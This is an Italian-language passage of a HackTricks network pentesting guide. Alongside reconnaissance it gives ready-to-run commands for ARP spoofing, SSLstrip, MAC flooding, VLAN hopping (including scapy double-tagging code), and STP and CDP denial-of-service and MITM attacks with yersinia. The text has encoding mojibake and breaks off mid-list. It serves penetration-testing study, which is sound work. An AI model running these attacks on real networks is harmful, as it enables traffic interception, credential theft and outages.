# Pentesting Network

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repository di Github**.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare ricompense fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Scoprire gli host dall'esterno

Questa sar√† una **breve sezione** su come trovare gli **IP che rispondono** dall'**Internet**.\
In questa situazione hai alcuni **range di IP** (forse anche diversi **range**) e devi solo trovare **quali IP rispondono**.

### ICMP

Questo √® il modo pi√π **facile** e **veloce** per scoprire se un host √® attivo o meno.\
Puoi provare a inviare alcuni pacchetti **ICMP** e **aspettare le risposte**. Il modo pi√π semplice √® inviare una **richiesta di echo** e aspettare la risposta. Puoi farlo usando un semplice `ping` o usando `fping` per **range**.\
Puoi anche usare **nmap** per inviare altri tipi di pacchetti ICMP (questo eviter√† i filtri per le comuni richieste-risposte di echo ICMP).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Scoperta delle porte TCP

√à molto comune trovare che tutti i tipi di pacchetti ICMP vengano filtrati. Quindi, tutto ci√≤ che puoi fare per verificare se un host √® attivo √® **provare a trovare porte aperte**. Ogni host ha **65535 porte**, quindi, se hai un "grande" scopo, **non puoi** testare se **ogni porta** di ogni host √® aperta o meno, ci√≤ richiederebbe troppo tempo.\
Quindi, ci√≤ di cui hai bisogno √® uno **scanner di porte veloce** ([masscan](https://github.com/robertdavidgraham/masscan)) e un elenco delle **porte pi√π utilizzate:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
√à possibile eseguire anche questo passaggio con `nmap`, ma √® pi√π lento e `nmap` ha problemi nell'identificazione degli host attivi.

### Scoperta della porta HTTP

Questa √® una semplice scoperta delle porte TCP utile quando si desidera **concentrarsi sulla scoperta dei servizi HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Scoperta delle porte UDP

Potresti anche provare a controllare se ci sono delle **porte UDP aperte** per decidere se dovresti **prestare pi√π attenzione** a un **host**. Poich√© i servizi UDP di solito **non rispondono** con **alcun dato** a un normale pacchetto di prova UDP vuoto, √® difficile dire se una porta √® filtrata o aperta. Il modo pi√π semplice per decidere ci√≤ √® inviare un pacchetto relativo al servizio in esecuzione e, poich√© non si sa quale servizio sia in esecuzione, si dovrebbe provare quello pi√π probabile in base al numero di porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La linea nmap proposta in precedenza tester√† le **prime 1000 porte UDP** in ogni host all'interno del range **/24**, ma anche solo questo richieder√† **>20 minuti**. Se hai bisogno di **risultati pi√π veloci**, puoi utilizzare [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Questo invier√† queste **sonde UDP** alla loro **porta prevista** (per un range /24 ci vorr√† solo 1 minuto): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Scoperta delle porte SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Qui puoi trovare una guida completa di tutti gli attacchi Wifi ben noti al momento della scrittura:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Scoprire gli host dall'interno

Se ti trovi all'interno della rete, una delle prime cose che vorrai fare √® **scoprire gli altri host**. A seconda di **quanto rumore** puoi/vuoi fare, possono essere eseguite diverse azioni:

### Passivo

Puoi utilizzare questi strumenti per scoprire passivamente gli host all'interno di una rete connessa:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Attivo

Si noti che le tecniche commentate in [_**Scoprire gli host dall'esterno**_](./#scoprire-gli-host-dallesterno) (_Scoperta delle porte TCP/HTTP/UDP/SCTP_) possono essere **applicate anche qui**.\
Ma, essendo nella **stessa rete** degli altri host, √® possibile fare **altre cose**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP attivo

Si noti che le tecniche commentate in _Scoperta degli host dall'esterno_ ([_**ICMP**_](./#icmp)) possono essere **applicate anche qui**.\
Ma, essendo nella **stessa rete** degli altri host, puoi fare **altre cose**:

* Se **pingi** un **indirizzo di broadcast della subnet**, il ping dovrebbe arrivare a **ogni host** e potrebbero **risponderti**: `ping -b 10.10.5.255`
* Pingando l'**indirizzo di broadcast della rete**, potresti trovare anche host all'interno di **altre subnet**: `ping -b 255.255.255.255`
* Usa le opzioni `-PE`, `-PP`, `-PM` di `nmap` per eseguire la scoperta degli host inviando rispettivamente richieste **ICMPv4 echo**, **timestamp** e **subnet mask**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan viene utilizzato per **accendere** i computer tramite un **messaggio di rete**. Il pacchetto magico utilizzato per accendere il computer √® semplicemente un pacchetto in cui viene fornito un **MAC Dst** e poi viene **ripetuto 16 volte** all'interno dello stesso pacchetto.\
Questo tipo di pacchetti di solito vengono inviati in un **ethernet 0x0842** o in un **pacchetto UDP alla porta 9**.\
Se **non viene fornito alcun \[MAC]**, il pacchetto viene inviato all'**ethernet di broadcast** (e il MAC di broadcast sar√† quello che viene ripetuto).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scansione degli Host

Una volta scoperti tutti gli IP (esterni o interni) che si desidera analizzare in profondit√†, √® possibile eseguire diverse azioni.

### TCP

* Porta **aperta**: _SYN --> SYN/ACK --> RST_
* Porta **chiusa**: _SYN --> RST/ACK_
* Porta **filtrata**: _SYN --> \[NESSUNA RISPOSTA]_
* Porta **filtrata**: _SYN --> messaggio ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Ci sono 2 opzioni per scansionare una porta UDP:

* Invia un **pacchetto UDP** e controlla la risposta _**ICMP unreachable**_ se la porta √® **chiusa** (in molti casi ICMP sar√† **filtrato** quindi non riceverai alcuna informazione se la porta √® chiusa o aperta).
* Invia **datagrammi formattati** per ottenere una risposta da un **servizio** (ad esempio, DNS, DHCP, TFTP e altri, come elencato in _nmap-payloads_). Se ricevi una **risposta**, allora la porta √® **aperta**.

**Nmap** combiner√† **entrambe** le opzioni utilizzando "-sV" (le scansioni UDP sono molto lente), ma nota che le scansioni UDP sono pi√π lente delle scansioni TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Scansione SCTP

**SCTP (Stream Control Transmission Protocol)** √® progettato per essere utilizzato insieme a **TCP (Transmission Control Protocol)** e **UDP (User Datagram Protocol)**. Il suo scopo principale √® facilitare il trasporto dei dati telefonici su reti IP, riflettendo molte delle caratteristiche di affidabilit√† presenti nel **Signaling System 7 (SS7)**. **SCTP** √® un componente fondamentale della famiglia di protocolli **SIGTRAN**, che mira a trasportare segnali SS7 su reti IP.

Il supporto per **SCTP** √® fornito da vari sistemi operativi, come **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** e **VxWorks**, indicando la sua ampia accettazione e utilit√† nel campo delle telecomunicazioni e delle reti.

Nmap offre due diverse scansioni per SCTP: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasione IDS e IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Altre opzioni di nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Rivelazione degli indirizzi IP interni

A volte, **router, firewall e dispositivi di rete mal configurati** rispondono alle sonde di rete utilizzando **indirizzi di origine non pubblici**. **tcpdump** pu√≤ essere utilizzato per identificare i pacchetti ricevuti da indirizzi privati durante i test. In particolare, su Kali Linux, i pacchetti possono essere catturati sull'interfaccia **eth2**, che √® accessibile dall'Internet pubblico. √à importante notare che se la tua configurazione √® dietro un NAT o un firewall, tali pacchetti sono probabilmente filtrati.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing ti consente di apprendere dettagli sugli intervalli di indirizzi IP, le dimensioni delle subnet, gli indirizzi MAC e i nomi host attraverso la revisione dei frame e dei pacchetti catturati. Se la rete √® configurata in modo errato o il tessuto di commutazione √® sotto stress, gli attaccanti possono catturare materiale sensibile tramite lo sniffing passivo di rete.

Se una rete Ethernet commutata √® configurata correttamente, vedrai solo frame di broadcast e materiale destinato al tuo indirizzo MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
√à possibile, inoltre, catturare pacchetti da una macchina remota tramite una sessione SSH con Wireshark come interfaccia grafica in tempo reale.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap √® uno strumento di hacking di rete che consente di eseguire attacchi di tipo man-in-the-middle (MITM) e sfruttare le vulnerabilit√† delle reti. √à un potente strumento che offre molte funzionalit√† per il pentesting di reti.

#### Installazione

Per installare Bettercap, √® possibile seguire i seguenti passaggi:

1. Assicurarsi di avere installato Go sul proprio sistema.
2. Clonare il repository di Bettercap da GitHub.
3. Eseguire il comando `make build` per compilare il codice sorgente.
4. Eseguire il comando `sudo make install` per installare Bettercap.

#### Utilizzo

Dopo aver installato Bettercap, √® possibile utilizzarlo per eseguire una variet√† di attacchi di hacking di rete. Alcuni esempi di comandi comuni includono:

- `bettercap -iface eth0`: avvia Bettercap sull'interfaccia di rete eth0.
- `set arp.spoof.targets 192.168.1.1,192.168.1.2`: imposta gli obiettivi per l'attacco ARP spoofing.
- `set dns.spoof.domains example.com`: imposta i domini per l'attacco di spoofing DNS.
- `set http.proxy.sslstrip true`: abilita l'attacco SSLstrip per intercettare il traffico HTTPS.
- `set net.sniff.verbose true`: abilita la modalit√† di sniffing dettagliata.

#### Risorse aggiuntive

Per ulteriori informazioni su Bettercap e le sue funzionalit√†, √® possibile consultare la [documentazione ufficiale di Bettercap](https://www.bettercap.org/documentation/).
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Ovviamente.

### Cattura delle credenziali

Puoi utilizzare strumenti come [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) per analizzare le credenziali da un file pcap o da un'interfaccia live.

## Attacchi LAN

### ARP spoofing

L'ARP Spoofing consiste nell'invio di risposte ARP gratuite per indicare che l'IP di una macchina ha il MAC del nostro dispositivo. Successivamente, la vittima modificher√† la tabella ARP e contatter√† la nostra macchina ogni volta che vorr√† contattare l'IP falsificato.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

L'arpspoofing √® una tecnica di hacking che coinvolge la manipolazione del protocollo ARP (Address Resolution Protocol) per inviare pacchetti di rete falsificati. Questa tecnica consente all'attaccante di intercettare, modificare o iniettare il traffico di rete tra due host comunicanti.

L'arpspoofing pu√≤ essere utilizzato per vari scopi, tra cui il furto di informazioni sensibili, l'intercettazione di credenziali di accesso e la creazione di attacchi di tipo "man-in-the-middle". Per eseguire un attacco di arpspoofing, l'attaccante deve essere posizionato sulla stessa rete locale dell'host di destinazione.

Per eseguire l'arpspoofing, √® possibile utilizzare strumenti come `arpspoof` o `ettercap`. Questi strumenti consentono all'attaccante di inviare pacchetti ARP falsificati per manipolare le tabelle ARP degli host di destinazione. In questo modo, l'attaccante pu√≤ indirizzare il traffico di rete destinato a un host specifico verso il proprio sistema, consentendo di intercettare o modificare il traffico.

Per proteggersi dall'arpspoofing, √® consigliabile utilizzare tecniche come l'uso di VLAN (Virtual Local Area Network), l'implementazione di autenticazione a due fattori e l'utilizzo di strumenti di rilevamento degli attacchi ARP come `arpscan` o `arpwatch`. Inoltre, √® importante mantenere il proprio sistema operativo e le applicazioni aggiornate per mitigare le vulnerabilit√† note che potrebbero essere sfruttate dagli attaccanti.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Overflow della CAM

Effettua un overflow della tabella CAM dello switch inviando molti pacchetti con diversi indirizzi MAC di origine. Quando la tabella CAM √® piena, lo switch inizia a comportarsi come un hub (trasmettendo tutto il traffico in broadcast).
```bash
macof -i <interface>
```
Nelle moderne switch questa vulnerabilit√† √® stata risolta.

### Attacchi 802.1Q VLAN / DTP

#### Trunking Dinamico

Il **Dynamic Trunking Protocol (DTP)** √® progettato come un protocollo di livello di collegamento per facilitare un sistema automatico per il trunking, consentendo agli switch di selezionare automaticamente le porte per la modalit√† trunk (Trunk) o non-trunk. La distribuzione di **DTP** √® spesso considerata indicativa di una progettazione di rete non ottimale, sottolineando l'importanza di configurare manualmente i trunk solo quando necessario e garantire una corretta documentazione.

Per impostazione predefinita, le porte dello switch sono impostate per funzionare in modalit√† Dynamic Auto, il che significa che sono pronte a avviare il trunking se sollecitate da uno switch vicino. Sorge una preoccupazione per la sicurezza quando un pentester o un attaccante si connette allo switch e invia un frame DTP Desirable, costringendo la porta a entrare in modalit√† trunk. Questa azione consente all'attaccante di enumerare le VLAN attraverso l'analisi dei frame STP e aggirare la segmentazione delle VLAN configurando interfacce virtuali.

La presenza di DTP in molti switch per impostazione predefinita pu√≤ essere sfruttata dagli avversari per imitare il comportamento di uno switch, ottenendo cos√¨ accesso al traffico su tutte le VLAN. Lo script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) viene utilizzato per monitorare un'interfaccia, rivelando se uno switch √® in modalit√† Default, Trunk, Dynamic, Auto o Access, quest'ultima essendo l'unica configurazione immune agli attacchi di VLAN hopping. Questo strumento valuta lo stato di vulnerabilit√† dello switch.

Se viene identificata una vulnerabilit√† di rete, lo strumento _**Yersinia**_ pu√≤ essere utilizzato per "abilitare il trunking" tramite il protocollo DTP, consentendo l'osservazione dei pacchetti da tutte le VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Per enumerare le VLAN √® anche possibile generare il frame DTP Desirable con lo script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Non interrompere lo script in nessuna circostanza. Inietta DTP Desirable ogni tre secondi. **I canali trunk creati dinamicamente sullo switch durano solo cinque minuti. Dopo cinque minuti, il trunk viene disattivato.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Vorrei sottolineare che **Access/Desirable (0x03)** indica che il frame DTP √® di tipo Desirable, il che indica alla porta di passare alla modalit√† Trunk. E **802.1Q/802.1Q (0xa5)** indica il tipo di incapsulamento **802.1Q**.

Analizzando i frame STP, **apprendiamo l'esistenza delle VLAN 30 e 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaccare VLAN specifiche

Una volta conosciuti gli ID delle VLAN e i valori degli IP, √® possibile **configurare un'interfaccia virtuale per attaccare una VLAN specifica**.\
Se DHCP non √® disponibile, utilizzare _ifconfig_ per impostare un indirizzo IP statico.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### VLAN Hopper Automatico

L'attacco discusso di **Dynamic Trunking e creazione di interfacce virtuali per scoprire host all'interno** di altre VLAN viene **eseguito automaticamente** dal tool: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Se un attaccante conosce il valore del **MAC, IP e VLAN ID dell'host vittima**, potrebbe provare a **doppio etichettare un frame** con la VLAN designata e la VLAN della vittima e inviare un pacchetto. Poich√© la **vittima non sar√† in grado di connettersi di nuovo** con l'attaccante, la **migliore opzione per l'attaccante √® comunicare tramite UDP** a protocolli che possono eseguire alcune azioni interessanti (come SNMP).

Un'altra opzione per l'attaccante √® lanciare una **scansione delle porte TCP falsificando un IP controllato dall'attaccante e accessibile dalla vittima** (probabilmente tramite internet). Quindi, l'attaccante potrebbe sniffare nel secondo host di sua propriet√† se riceve alcuni pacchetti dalla vittima.

![](<../../.gitbook/assets/image (635) (1).png>)

Per eseguire questo attacco √® possibile utilizzare scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass della segmentazione VLAN laterale <a href="#d679" id="d679"></a>

Se hai **accesso a uno switch a cui sei direttamente connesso**, hai la possibilit√† di **bypassare la segmentazione VLAN** all'interno della rete. Basta **passare la porta in modalit√† trunk** (nota anche come trunk), creare interfacce virtuali con gli ID delle VLAN di destinazione e configurare un indirizzo IP. Puoi provare a richiedere l'indirizzo in modo dinamico (DHCP) o puoi configurarlo staticamente. Dipende dal caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypass della VLAN privata di livello 3

In determinati ambienti, come le reti wireless per ospiti, vengono implementate impostazioni di **isolamento della porta (nota anche come VLAN privata)** per impedire ai client connessi a un punto di accesso wireless di comunicare direttamente tra loro. Tuttavia, √® stata identificata una tecnica che pu√≤ eludere queste misure di isolamento. Questa tecnica sfrutta la mancanza di ACL di rete o la loro configurazione impropria, consentendo ai pacchetti IP di essere instradati attraverso un router per raggiungere un altro client nella stessa rete.

L'attacco viene eseguito creando un **pacchetto che porta l'indirizzo IP del client di destinazione ma con l'indirizzo MAC del router**. Ci√≤ fa s√¨ che il router in modo errato inoltri il pacchetto al client di destinazione. Questo approccio √® simile a quello utilizzato negli attacchi di doppio tagging, in cui viene sfruttata la possibilit√† di controllare un host accessibile alla vittima per sfruttare la falla di sicurezza.

**Passaggi chiave dell'attacco:**
1. **Creazione di un pacchetto:** Viene creato un pacchetto appositamente progettato per includere l'indirizzo IP del client di destinazione ma con l'indirizzo MAC del router.
2. **Sfruttamento del comportamento del router:** Il pacchetto creato viene inviato al router, che, a causa della configurazione, reindirizza il pacchetto al client di destinazione, bypassando l'isolamento fornito dalle impostazioni di VLAN private.

### Attacchi VTP

VTP (VLAN Trunking Protocol) centralizza la gestione delle VLAN. Utilizza numeri di revisione per mantenere l'integrit√† del database delle VLAN; ogni modifica incrementa questo numero. Gli switch adottano le configurazioni con numeri di revisione pi√π alti, aggiornando i propri database delle VLAN.

#### Ruoli del dominio VTP

- **VTP Server:** Gestisce le VLAN: crea, elimina, modifica. Trasmette gli annunci VTP ai membri del dominio.
- **VTP Client:** Riceve gli annunci VTP per sincronizzare il proprio database delle VLAN. Questo ruolo √® limitato dalle modifiche locali alla configurazione delle VLAN.
- **VTP Transparent:** Non partecipa agli aggiornamenti VTP ma inoltra gli annunci VTP. Non influenzato dagli attacchi VTP, mantiene un numero di revisione costante pari a zero.

#### Tipi di annunci VTP

- **Annuncio di riepilogo:** Trasmesso dal server VTP ogni 300 secondi, contiene informazioni essenziali sul dominio.
- **Annuncio di sottoinsieme:** Inviato in seguito a modifiche nella configurazione delle VLAN.
- **Richiesta di annuncio:** Emessa da un client VTP per richiedere un annuncio di riepilogo, di solito in risposta alla rilevazione di un numero di revisione di configurazione superiore.

Le vulnerabilit√† VTP sono sfruttabili esclusivamente tramite porte trunk poich√© gli annunci VTP circolano solo attraverso di esse. Gli scenari di attacco successivi a DTP potrebbero puntare a VTP. Strumenti come Yersinia possono facilitare gli attacchi VTP, mirando a cancellare il database delle VLAN e interrompere efficacemente la rete.

Nota: Questa discussione riguarda la versione 1 di VTP (VTPv1).
```bash
%% yersinia -G # Launch Yersinia in graphical mode ```
```
Nella modalit√† grafica di Yersinia, scegli l'opzione per eliminare tutti i VLAN VTP per purgare il database delle VLAN.


### Attacchi STP

**Se non riesci a catturare i frame BPDU sulle tue interfacce, √® improbabile che tu riesca in un attacco STP.**

#### **DoS BPDU STP**

Inviando molti BPDUs TCP (Notifica di Cambio Topologia) o Conf (i BPDUs che vengono inviati quando la topologia viene creata), gli switch vengono sovraccaricati e smettono di funzionare correttamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attacco STP TCP**

Quando viene inviato un pacchetto TCP, la tabella CAM degli switch verr√† cancellata in 15 secondi. Quindi, se si inviano continuamente questo tipo di pacchetti, la tabella CAM verr√† riavviata continuamente (o ogni 15 secondi) e quando viene riavviata, lo switch si comporta come un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attacco STP Root**

L'attaccante simula il comportamento di uno switch per diventare la radice STP della rete. Successivamente, pi√π dati passeranno attraverso di lui. Questo √® interessante quando si √® connessi a due switch diversi.\
Ci√≤ viene fatto inviando pacchetti BPDUs CONF che indicano che il valore della **priorit√†** √® inferiore alla priorit√† effettiva dello switch radice attuale.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se l'attaccante √® connesso a 2 switch, pu√≤ diventare la radice del nuovo albero e tutto il traffico tra quei switch passer√† attraverso di lui** (verr√† eseguito un attacco MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attacchi CDP

Il protocollo di scoperta CISCO (CDP) √® essenziale per la comunicazione tra dispositivi CISCO, consentendo loro di **identificarsi reciprocamente e condividere dettagli di configurazione**.

#### Raccolta passiva di dati <a href="#0e0f" id="0e0f"></a>

CDP √® configurato per trasmettere informazioni attraverso tutte le porte, il che potrebbe comportare un rischio per la sicurezza. Un attaccante, una volta connesso a una porta dello switch, potrebbe utilizzare sniffer di rete come **Wireshark**, **tcpdump** o **Yersinia**. Questa azione pu√≤ rivelare dati sensibili sul dispositivo di rete, inclusi il suo modello e la versione di Cisco IOS in esecuzione. L'attaccante potrebbe quindi mirare a vulnerabilit√† specifiche nella versione di Cisco IOS identificata.

#### Induzione di un flooding della tabella CDP <a href="#0d6a" id="0d6a"></a>

Un approccio pi√π aggressivo prevede il lancio di un attacco Denial of Service (DoS) sovraccaricando la memoria dello switch, fingendo di essere dispositivi CISCO legittimi. Di seguito √® riportata la sequenza di comandi per avviare un tale attacco utilizzando Yersinia, uno strumento di rete progettato per il testing:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante questo attacco, la CPU dello switch e la tabella dei vicini CDP sono gravemente sovraccaricate, portando a ci√≤ che viene spesso definito **"paralisi di rete"** a causa del consumo eccessivo di risorse.

#### Attacco di impersonificazione CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
√à possibile utilizzare anche [**scapy**](https://github.com/secdev/scapy/). Assicurati di installarlo con il pacchetto `scapy/contrib`.

### Attacchi VoIP e lo strumento VoIP Hopper

I telefoni VoIP, sempre pi√π integrati con dispositivi IoT, offrono funzionalit√† come lo sblocco delle porte o il controllo dei termostati tramite numeri di telefono speciali. Tuttavia, questa integrazione pu√≤ comportare rischi per la sicurezza.

Lo strumento [**voiphopper**](http://voiphopper.sourceforge.net) √® progettato per emulare un telefono VoIP in vari ambienti (Cisco, Avaya, Nortel, Alcatel-Lucent). Scopre l'ID VLAN della rete vocale utilizzando protocolli come CDP, DHCP, LLDP-MED e 802.1Q ARP.

**VoIP Hopper** offre tre modalit√† per il protocollo di scoperta Cisco (CDP):

1. **Modalit√† Sniff** (`-c 0`): Analizza i pacchetti di rete per identificare l'ID VLAN.
